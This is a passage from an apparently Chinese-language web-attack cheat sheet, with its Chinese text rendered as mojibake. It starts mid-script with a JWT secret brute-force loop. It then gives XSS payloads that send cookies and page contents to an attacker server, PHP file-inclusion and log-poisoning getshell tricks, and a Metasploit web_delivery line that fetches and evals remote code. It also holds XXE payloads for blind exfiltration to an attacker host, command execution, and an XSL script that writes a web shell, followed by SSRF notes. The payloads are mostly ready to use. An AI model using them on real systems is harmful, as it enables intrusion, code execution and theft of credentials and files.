key_ = line.strip()
try:
  jwt.decode(jwt_str,verify=True,key=key_)
  print(&#39;\r&#39;,&#39;\bfound key --&gt;&#39;,termcolor.colored(key_,&#39;green&#39;),&#39;&lt;--&#39;)
  break
except(jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):
  print(&#39;\r&#39;,&#39;\bfound key --&gt;&#39;,termcolor.colored(key_,&#39;green&#39;),&#39;&lt;--&#39;)
except jwt.exceptions.InvalidSignatureError:
  print(&#39;\r&#39;,&#39; &#39; * 64, &#39;\r\btry&#39;,key_,end=&#39;&#39;,flush=True)
  continue
</code></pre>
<p>  else:</p>
<pre><code>print(&#39;\r&#39;,&#39;\bnot found.&#39;)
</code></pre>
<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>  æ‰“COOKIE<br>  &lt;svg/onload=â€javascript:document.location.href=(â€˜<a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:7777/?cookie=&#39;+document.cookie)&quot;&gt;">http://xx.xx.xx.xx:7777?cookie=&#39;+document.cookie)&quot;&gt;</a><br>  è¯»å–HTML<br>  &lt;svg/onload=â€document.location=â€™<a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:7777/?&#39;+btoa(document.body.innerHTML)&quot;&gt;">http://xx.xx.xx.xx:7777/?&#39;+btoa(document.body.innerHTML)&quot;&gt;</a><br>  è¯»æ–‡ä»¶<br>  &lt;svg/onload=â€<br>  xmlhttp=new XMLHttpRequest();<br>  xmlhttp.onreadystatechange=function()<br>  {</p>
<pre><code>  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
  &#123;
      document.location=&#39;http://xx.xx.xx.xx:7777/?&#39;+btoa(xmlhttp.responseText);
  &#125;
</code></pre>
<p>  }<br>  xmlhttp.open(â€œGETâ€,â€file.phpâ€,true);<br>  xmlhttp.send();<br>  â€œ&gt;<br>  XSS+SSRFè¯»å–æœåŠ¡å™¨æ–‡ä»¶</p>
<p>  &lt;svg/onload=â€<br>  xmlhttp=new XMLHttpRequest();<br>  xmlhttp.onreadystatechange=function()<br>  {<br>  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)<br>  {</p>
<pre><code>  document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText);
</code></pre>
<p>  }<br>  }<br>  xmlhttp.open(â€œPOSTâ€,â€request.phpâ€,true);<br>  xmlhttp.setRequestHeader(â€œContent-typeâ€,â€application/x-www-form-urlencodedâ€);<br>  xmlhttp.send(â€œurl=file:///etc/passwdâ€);<br>  â€œ&gt;</p>
<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>  æŸ¥çœ‹æœ‰æ— tokenç­‰éªŒè¯èº«ä»½çš„å‚æ•°ï¼Œåˆ æ‰åæ˜¯å¦è¿”å›æ­£å¸¸<br>  æŸ¥çœ‹headerä¸­referer,originå‚æ•°ï¼Œåˆ æ‰åæ˜¯å¦è¿”å›æ­£å¸¸<br>  ä½¿ç”¨csrftester/burpsuiteç”Ÿæˆè¡¨å•ï¼Œä»¥å¦ä¸€è´¦å·å’Œæµè§ˆå™¨æ‰“å¼€æµ‹è¯•<br>  å»æ‰refererä¸­åŸŸååé¢çš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶<br>  æ›¿æ¢äºŒçº§åŸŸå</p>
<h4 id="phpä»»æ„æ–‡ä»¶è¯»å–-ä¸‹è½½"><a href="#phpä»»æ„æ–‡ä»¶è¯»å–-ä¸‹è½½" class="headerlink" title="phpä»»æ„æ–‡ä»¶è¯»å–/ä¸‹è½½"></a>phpä»»æ„æ–‡ä»¶è¯»å–/ä¸‹è½½</h4><p>  readfile()ã€file_get_contents()ã€fopen()ç­‰è¯»æ–‡ä»¶çš„å‡½æ•°ä¸ä¸¥è°¨ï¼Œè¯»å–æ–‡ä»¶è·¯å¾„å¯æ§ï¼Œè¾“å‡ºå†…å®¹ã€‚<br>  ä¸‹è½½é…ç½®æ–‡ä»¶<br>  Redisã€Weblogicã€ftpã€mysqlã€webé…ç½®æ–‡ä»¶ã€historyæ–‡ä»¶ã€æ•°æ®åº“é…ç½®æ–‡ä»¶<br>  ä¸‹è½½logæ–‡ä»¶<br>  ä¸‹è½½webæ–‡ä»¶<br>  /1.php?f=../../etc/passwd<br>  /1.php?f=file:///etc/passwd(file://ç»•è¿‡../çš„é˜²æŠ¤)<br>  /1.php?f=file:///etc/passwd</p>
<h4 id="phpæ–‡ä»¶åŒ…å«"><a href="#phpæ–‡ä»¶åŒ…å«" class="headerlink" title="phpæ–‡ä»¶åŒ…å«"></a>phpæ–‡ä»¶åŒ…å«</h4><p>  å‡½æ•°:<br>  include<br>  require<br>  include_once<br>  require_once</p>
<h5 id="å¸¸ç”¨åè®®"><a href="#å¸¸ç”¨åè®®" class="headerlink" title="å¸¸ç”¨åè®®"></a>å¸¸ç”¨åè®®</h5><p>  file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ<br>  fileåè®®çš„å·¥ä½œç›®å½•æ˜¯å½“å‰ç›®å½•ï¼Œä½¿ç”¨file:///wwwroot/1.phpç­‰åŒäº./wwwroot/1.phpå¯ç”¨äºç»•è¿‡ä¸€äº›æƒ…å†µ<br>  php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰<br><img src="./img/3.png" alt="image"></p>
<p>  è¯»å–<br>  /1.php?file=php://filter/read=convert.base64-encode/resource=./1.php<br>  å†™å…¥<br>  /1.php?file=php://filter/write=convert.base64-decode/resource=[file]â€,â€base64</p>
<h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>  <a target="_blank" rel="noopener" href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a></p>
<h6 id="allow-url-include-å¼€å¯æ—¶Getshell"><a href="#allow-url-include-å¼€å¯æ—¶Getshell" class="headerlink" title="allow_url_include å¼€å¯æ—¶Getshell"></a>allow_url_include å¼€å¯æ—¶Getshell</h6><p>  è¿œç¨‹æ–‡ä»¶åŒ…å«<br>  /1.php?file=<a target="_blank" rel="noopener" href="http://remote.com/shell.txt">http://remote.com/shell.txt</a><br>  /1.php?file=php://input  POST:<?php phpinfo();?><br>  æˆ–ä½¿ç”¨curl</p>
<blockquote>
<p>curl -v â€œ<a target="_blank" rel="noopener" href="http://127.0.0.1:8888/ctf/cli/3.php?file=php://input&quot;">http://127.0.0.1:8888/ctf/cli/3.php?file=php://input&quot;</a> -d â€œ<?php phpinfo();?>â€œ<br>  æˆ–ä½¿ç”¨data://åè®®è§£æbase64çš„ä»£ç <br>  /1.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg==</p>
</blockquote>
<h6 id="allow-url-include-å…³é—­æ—¶Getshell"><a href="#allow-url-include-å…³é—­æ—¶Getshell" class="headerlink" title="allow_url_include å…³é—­æ—¶Getshell"></a>allow_url_include å…³é—­æ—¶Getshell</h6><p>  æ”»å‡»æœºå¼€å¯å…±äº«<br>  /1.php?file=//attacker/1.php<br>  åˆ›å»ºwebdavæœåŠ¡ï¼Œshellæ–‡ä»¶æ”¾å…¥ç›®å½•åŒ…å«å³å¯</p>
<blockquote>
<p>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 â€“rm â€“name webdav bytemark/webdav<br>  Shellæ–‡ä»¶æ”¾å…¥/root/webdav/data<br>  /1.php?file=//attacker/1.php</p>
</blockquote>
<h6 id="åŒ…å«æ—¥å¿—æ–‡ä»¶getshell"><a href="#åŒ…å«æ—¥å¿—æ–‡ä»¶getshell" class="headerlink" title="åŒ…å«æ—¥å¿—æ–‡ä»¶getshell"></a>åŒ…å«æ—¥å¿—æ–‡ä»¶getshell</h6><p>  Fuzzæ–‡ä»¶<br>  <a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br>  <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a><br>  <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33020901/article/details/78810035">https://blog.csdn.net/qq_33020901/article/details/78810035</a><br>  /1.php?file=<?php phpinfo();?><br>  /1.php?file=../../../../../../../var/log/apache2/access.log<br>  Winä¸‹ä½¿ç”¨phpstudy<br>  è¯·æ±‚/<?php phpinfo();?><br>  åŒ…å«é”™è¯¯æ—¥å¿—<br>  /1.php?file=C:\phpStudy\Apache\logs\error.log</p>
<h6 id="ä¸Šä¼ ä¸ªå›¾ç‰‡æ ¼å¼çš„æœ¨é©¬ç›´æ¥åŒ…å«"><a href="#ä¸Šä¼ ä¸ªå›¾ç‰‡æ ¼å¼çš„æœ¨é©¬ç›´æ¥åŒ…å«" class="headerlink" title="ä¸Šä¼ ä¸ªå›¾ç‰‡æ ¼å¼çš„æœ¨é©¬ç›´æ¥åŒ…å«"></a>ä¸Šä¼ ä¸ªå›¾ç‰‡æ ¼å¼çš„æœ¨é©¬ç›´æ¥åŒ…å«</h6><p>  /1.php?file=/uploadfile/1.jpg</p>
<h6 id="é™åˆ¶åç¼€æ—¶"><a href="#é™åˆ¶åç¼€æ—¶" class="headerlink" title="é™åˆ¶åç¼€æ—¶"></a>é™åˆ¶åç¼€æ—¶</h6>  <?php
  $file = $_GET['file'].".php";
  include($file);
  ?><br>
  åˆ©ç”¨ä¼ªåè®®zipï¼Œæ„é€ ä¸€ä¸ªzipå‹ç¼©åŒ…ï¼Œæ‰“åŒ…ä¸€ä¸ªshell.phpï¼Œå°†å‹ç¼©åŒ…æ›´åä¸ºpng
![image](./img/4.png)

<p>  è¯·æ±‚/1.php?file=zip://shell.png%23shell<br><img src="./img/5.png" alt="image"></p>
<p>  ä¹Ÿå¯ä½¿ç”¨pharåè®®è®¿é—®<br>  /1.php?file=phar://shell.png/shell<br>  è€ç‰ˆæœ¬å¯ä»¥ä½¿ç”¨%00æˆªæ–­<br>  /etc/passwd%00<br>  (éœ€è¦ magic_quotes_gpc=offï¼ŒPHPå°äº5.3.4æœ‰æ•ˆ)<br>  /var/www/%00<br>  /etc/passwd/././././././.[â€¦]/./././././.<br>  (éœ€è¦ magic_quotes_gpc=off<br>  (phpç‰ˆæœ¬å°äº5.2.8(?)å¯ä»¥æˆåŠŸï¼Œlinuxéœ€è¦æ–‡ä»¶åé•¿äº4096ï¼Œwindowséœ€è¦é•¿äº256)<br>  ç‚¹å·æˆªæ–­ï¼š<br>  /boot.ini/â€¦â€¦â€¦[â€¦]â€¦â€¦â€¦â€¦<br>  (phpç‰ˆæœ¬å°äº5.2.8(?)å¯ä»¥æˆåŠŸï¼Œåªé€‚ç”¨windowsï¼Œç‚¹å·éœ€è¦é•¿äº256)</p>
<h6 id="phpinfo-LFI-æœ¬åœ°æ–‡ä»¶åŒ…å«ä¸´æ—¶æ–‡ä»¶getshell"><a href="#phpinfo-LFI-æœ¬åœ°æ–‡ä»¶åŒ…å«ä¸´æ—¶æ–‡ä»¶getshell" class="headerlink" title="phpinfo-LFI æœ¬åœ°æ–‡ä»¶åŒ…å«ä¸´æ—¶æ–‡ä»¶getshell"></a>phpinfo-LFI æœ¬åœ°æ–‡ä»¶åŒ…å«ä¸´æ—¶æ–‡ä»¶getshell</h6><p>  åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶åˆ é™¤æ—¶é—´å·®è·å–shell<br>  éœ€è¦ä¸€ä¸ªlfiæ¼æ´+phpinfoé¡µé¢<br>  åœ¨/tmp/ç›®å½•ä¸‹ç”Ÿæˆä¸ªå¯†ç ä¸ºfçš„ä¸€å¥è¯æœ¨é©¬g<br><img src="./img/6.png" alt="image"></p>
<p>  ä¿®æ”¹è„šæœ¬çš„phpinfoæ–‡ä»¶åç§°<br><img src="./img/7.png" alt="image"></p>
<p>  LFIæ–‡ä»¶<br><img src="./img/8.png" alt="image"></p>
<p>  æ‰§è¡Œ</p>
<blockquote>
<p>python getshell.py 192.168.0.108 80 100<br>  80æ˜¯ç«¯å£ã€100æ˜¯çº¿ç¨‹<br><img src="./img/9.png" alt="image"><br><img src="./img/10.png" alt="image"></p>
</blockquote>
<p>  <a target="_blank" rel="noopener" href="http://192.168.0.110/index.php?file=../../../tmp/g&amp;f=echo%20%271%27">http://192.168.0.110/index.php?file=../../../tmp/g&amp;f=echo%20%271%27</a></p>
<h6 id="session-lfi-getshell"><a href="#session-lfi-getshell" class="headerlink" title="session + lfi getshell"></a>session + lfi getshell</h6><p>  session.upload_progress.enabledå¯ç”¨æ—¶ï¼Œæ–‡ä»¶ä¸Šä¼ ä¼šäº§ç”Ÿè¿›åº¦æ–‡ä»¶<br>  /var/lib/php5/sess_<br>  /var/lib/php/sess_</p>
<h6 id="LFI-SSH-Log"><a href="#LFI-SSH-Log" class="headerlink" title="LFI SSH Log"></a>LFI SSH Log</h6><blockquote>
<p>ssh â€˜<?php system($_GET['c']); ?>â€˜@192.168.0.107<br><a target="_blank" rel="noopener" href="http://192.168.0.107/lfi.php?file=/var/log/auth.log&amp;c=ls">http://192.168.0.107/lfi.php?file=/var/log/auth.log&amp;c=ls</a></p>
</blockquote>
<h6 id="RFI-amp-å‘½ä»¤æ³¨å…¥ä¸Šçº¿MSF"><a href="#RFI-amp-å‘½ä»¤æ³¨å…¥ä¸Šçº¿MSF" class="headerlink" title="RFI&amp;å‘½ä»¤æ³¨å…¥ä¸Šçº¿MSF"></a>RFI&amp;å‘½ä»¤æ³¨å…¥ä¸Šçº¿MSF</h6><p>  MSFç”Ÿæˆ<br>  #use exploit/multi/script/web_delivery<br>  #set target PHP<br>  æ³¨å…¥ç‚¹æ³¨å…¥ï¼š<br>  php -d allow_url_fopen=true -r â€œeval(file_get_contents(â€˜<a target="_blank" rel="noopener" href="http://192.168.0.107:1234/OgsOFaj3yKH&#39;));&quot;">http://192.168.0.107:1234/OgsOFaj3yKH&#39;));&quot;</a><br>  RFIï¼š<br>  <a target="_blank" rel="noopener" href="http://www.xx.com/file=http://192.168.0.107:1234/OgsOFaj3yKH">http://www.xx.com/file=http://192.168.0.107:1234/OgsOFaj3yKH</a></p>
</li>
</ul>
<h4 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h4><pre><code>XMLè®¾è®¡çš„å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œéæ˜¾ç¤ºæ•°æ®
XXE=XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€XML=å¯æ‰©å±•æ ‡è®°è¯­è¨€
Xmlæ–‡ä»¶å£°æ˜
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
DTDä¸ºXMLçš„æ–‡æ¡£ç±»å‹å®šä¹‰
å¼•å…¥å¤–éƒ¨DTD
&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;filename&quot;&gt;
å‚æ•°å®ä½“+å¤–éƒ¨å®ä½“
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
    %file;
]&gt;
</code></pre>
<h5 id="XMLæ³¨å…¥"><a href="#XMLæ³¨å…¥" class="headerlink" title="XMLæ³¨å…¥"></a>XMLæ³¨å…¥</h5><pre><code>é—­åˆæ ‡ç­¾ï¼Œæ”¹å†™xmlæ–‡ä»¶ï¼Œç”¨æˆ·å¯æ§ï¼Œæœ‰æ‹¼æ¥ä»£ç 
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;manager&gt;
    &lt;admin id=&quot;1&quot;&gt;
&lt;username&gt;admin&lt;/username&gt;
&lt;password&gt;admin&lt;/password&gt;
&lt;/admin&gt;
&lt;admin id=&quot;2&quot;&gt;
&lt;username&gt;root&lt;/username&gt;
&lt;password&gt;root&lt;/password&gt;
&lt;/admin&gt;
&lt;/manager&gt;
è‹¥æ˜¯passwordå¯æ§ï¼Œæ‹¼æ¥ä»£ç å½¢æˆæ³¨å…¥
admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;
</code></pre>
<h5 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h5><pre><code>https://github.com/AonCyberLabs/xxe-recursive-download
ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæœªç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»ç­‰å±å®³
</code></pre>
<h6 id="åˆ¤æ–­"><a href="#åˆ¤æ–­" class="headerlink" title="åˆ¤æ–­"></a>åˆ¤æ–­</h6><pre><code>å›æ˜¾è·¯å¾„
    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;test&quot;&gt;%remote;]&gt;
DNSLOG
    http://www.dnslog.cn/
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY dtd SYSTEM &quot;http://xxx.dnslog.cn/xxe&quot;&gt;]&gt;
&lt;xxe&gt;&amp;dtd;&lt;/xxe&gt;
Webdav
    å­˜åœ¨webdavå¯ä½¿ç”¨PROPPATCHã€PROPFINDã€ LOCKç­‰è¯·æ±‚æ–¹æ³•æ¥å—xmlè¾“å…¥å½¢æˆxxe
Wsdlä½¿ç”¨AWVSæµ‹è¯•
</code></pre>
<h6 id="æŒ–æ˜"><a href="#æŒ–æ˜" class="headerlink" title="æŒ–æ˜"></a>æŒ–æ˜</h6><pre><code>å¦‚é‡ä¸xmläº¤äº’çš„åœ°æ–¹
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [  
&lt;!ENTITY test &quot;this is test&quot;&gt; 
]&gt; 
&lt;root&gt;&amp;test;&lt;/root&gt;
çœ‹æ˜¯å¦è¾“å‡º
æ£€æŸ¥æ˜¯å¦æ”¯æŒå¤–éƒ¨å®ä½“
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [  
&lt;!ENTITY % foo SYSTEM &quot;http://attacker/evil.xml&quot;&gt; 
%foo;
]&gt; 
æŸ¥çœ‹ä½ çš„æœåŠ¡å™¨æ˜¯å¦æœ‰è¯·æ±‚
JSON content-type XXE
ä¿®æ”¹Content-Type: application/xml
X-Requested-With: XMLHttpRequest
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;root&gt;
&lt;å‚æ•°name&gt;name&lt;/å‚æ•°name&gt;
&lt;å‚æ•°value&gt;&amp;xxe;&lt;/ å‚æ•°value&gt;
&lt;/root&gt;
</code></pre>
<h6 id="æœ‰å›æ˜¾è¯»å–æœ¬åœ°æ–‡ä»¶"><a href="#æœ‰å›æ˜¾è¯»å–æœ¬åœ°æ–‡ä»¶" class="headerlink" title="æœ‰å›æ˜¾è¯»å–æœ¬åœ°æ–‡ä»¶"></a>æœ‰å›æ˜¾è¯»å–æœ¬åœ°æ–‡ä»¶</h6><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE creds [  
&lt;!ENTITY goodies SYSTEM &quot;file:////etc/passwd&quot;&gt; ]&gt; 
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
ä¹Ÿå¯å»æ‰æ–‡ä»¶åˆ—ç›®å½•
file:///root/.sh/id_rsa
ç‰¹æ®Šå­—ç¬¦
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE roottag [
&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
&lt;!ENTITY % goodies SYSTEM &quot;file:////tmp/xxx.txt&quot;&gt;  
&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
&lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt; 
%dtd; ]&gt; 
&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
evil.dtd
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
</code></pre>
<h6 id="Blind-OOB-XXEæ— å›æ˜¾è¯»å–"><a href="#Blind-OOB-XXEæ— å›æ˜¾è¯»å–" class="headerlink" title="Blind OOB XXEæ— å›æ˜¾è¯»å–"></a>Blind OOB XXEæ— å›æ˜¾è¯»å–</h6><pre><code>éœ€ä½¿ç”¨å‚æ•°å®ä½“ï¼Œå¼•ç”¨å¤–éƒ¨DTD
Payload
&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
%remote;%int;%send;
]&gt;
test.dtd
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://attacker:9999?p=%file;&#39;&gt;&quot;&gt;
</code></pre>
<h6 id="åˆ—ç›®å½•"><a href="#åˆ—ç›®å½•" class="headerlink" title="åˆ—ç›®å½•"></a>åˆ—ç›®å½•</h6><pre><code>è¿œç¨‹payload
&lt;!ENTITY % a SYSTEM &quot;file:///&quot;&gt; &lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &#39;gopher://ip:80/%a;&#39;&gt;&quot;&gt; %b; %c;
æ³¨å…¥payload
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://attacker:80/1.xml&quot;&gt;%remote;]&gt;&lt;root/&gt;
</code></pre>
<h6 id="ä¸åŒå¹³å°æ”¯æŒçš„åè®®"><a href="#ä¸åŒå¹³å°æ”¯æŒçš„åè®®" class="headerlink" title="ä¸åŒå¹³å°æ”¯æŒçš„åè®®"></a>ä¸åŒå¹³å°æ”¯æŒçš„åè®®</h6><p><img src="./img/11.png" alt="image"></p>
<h6 id="æ‰§è¡Œå‘½ä»¤"><a href="#æ‰§è¡Œå‘½ä»¤" class="headerlink" title="æ‰§è¡Œå‘½ä»¤"></a>æ‰§è¡Œå‘½ä»¤</h6><pre><code>å®‰è£…expectæ‰©å±•çš„PHPç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;
</code></pre>
<h6 id="å†…ç½‘ä¸»æœºæ¢æµ‹"><a href="#å†…ç½‘ä¸»æœºæ¢æµ‹" class="headerlink" title="å†…ç½‘ä¸»æœºæ¢æµ‹"></a>å†…ç½‘ä¸»æœºæ¢æµ‹</h6><pre><code>å¯å…ˆè¯»å–/etc/network/interfacesã€/proc/net/arpã€/etc/hostsç­‰æ–‡ä»¶æŸ¥è¯¢IPæ®µ
ä½¿ç”¨è„šæœ¬
</code></pre>
<h6 id="å†…ç½‘ç«¯å£æ‰«æ"><a href="#å†…ç½‘ç«¯å£æ‰«æ" class="headerlink" title="å†…ç½‘ç«¯å£æ‰«æ"></a>å†…ç½‘ç«¯å£æ‰«æ</h6><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  
&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:515/&quot; [  
&lt;!ELEMENT data (#PCDATA)&gt;  
]&gt;
&lt;data&gt;4&lt;/data&gt;
å¯ä½¿ç”¨burpsuiteçš„intruderæ¨¡å—è¿›è¡Œéå†
</code></pre>
<h6 id="å†…éƒ¨DTDåˆ©ç”¨"><a href="#å†…éƒ¨DTDåˆ©ç”¨" class="headerlink" title="å†…éƒ¨DTDåˆ©ç”¨"></a>å†…éƒ¨DTDåˆ©ç”¨</h6><h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h6><pre><code>    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
    &lt;!ENTITY % ISOamsa &#39;Your DTD code&#39;&gt;
%local_dtd;
</code></pre>
<h6 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h6><pre><code>&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;
&lt;!ENTITY % SuperClass &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;
%local_dtd;
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE message [
&lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;

&lt;!ENTITY % condition &#39;aaa)&gt;
    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
    &amp;#x25;eval;
    &amp;#x25;error;
    &lt;!ELEMENT aa (bb&#39;&gt;

%local_dtd;
]&gt;
&lt;message&gt;any text&lt;/message&gt;
</code></pre>
<h6 id="XXEå†™shell"><a href="#XXEå†™shell" class="headerlink" title="XXEå†™shell"></a>XXEå†™shell</h6><pre><code>å½“XXEæ”¯æŒXSLæ—¶
&lt;?xml version=&#39;1.0&#39;?&gt;
&lt;xsl:stylesheet version=&quot;1.0&quot;
xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;
xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;
&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;user&quot;&gt;
&lt;![CDATA[
public string xml()
&#123;
    System.Net.WebClient webClient = new System.Net.WebClient();
    webClient.DownloadFile(&quot;https://x.x.x.x/shell.txt&quot;,
                   @&quot;c:\inetpub\wwwroot\shell.aspx&quot;);

return &quot;Exploit Success&quot;;
&#125;
]]&gt;
&lt;/msxsl:script&gt;
&lt;xsl:template match=&quot;/&quot;&gt;
&lt;xsl:value-of select=&quot;user:xml()&quot;/&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h5><pre><code>æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ 
æ„é€ ä¸€ä¸ªç”±æœåŠ¡å™¨å‘å‡ºè¯·æ±‚çš„æ¼æ´
æœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶
</code></pre>
<h5 id="æˆå› "><a href="#æˆå› " class="headerlink" title="æˆå› "></a>æˆå› </h5><pre><code>file_get_contents()ã€fsockopen()ã€curl_exec()ã€fopen()ã€readfile()ç­‰å‡½æ•°ä½¿ç”¨ä¸å½“ä¼šé€ æˆSSRFæ¼æ´
</code></pre>
<h5 id="æŒ–æ˜-1"><a href="#æŒ–æ˜-1" class="headerlink" title="æŒ–æ˜"></a>æŒ–æ˜</h5><pre><code>è½¬ç æœåŠ¡
åœ¨çº¿ç¿»è¯‘
è·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º
è¯·æ±‚è¿œç¨‹æœåŠ¡å™¨èµ„æºçš„åœ°æ–¹ï¼Œå›¾ç‰‡åŠ è½½ä¸ä¸‹è½½(é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡)
å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½
å¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹ï¼Œç½‘ç«™é‡‡é›†ã€ç½‘é¡µæŠ“å–çš„åœ°æ–¹ã€‚
å¤´åƒ (è¿œç¨‹åŠ è½½å¤´åƒ)
ä¸€åˆ‡è¦ä½ è¾“å…¥ç½‘å€çš„åœ°æ–¹å’Œå¯ä»¥è¾“å…¥ipçš„åœ°æ–¹ã€‚
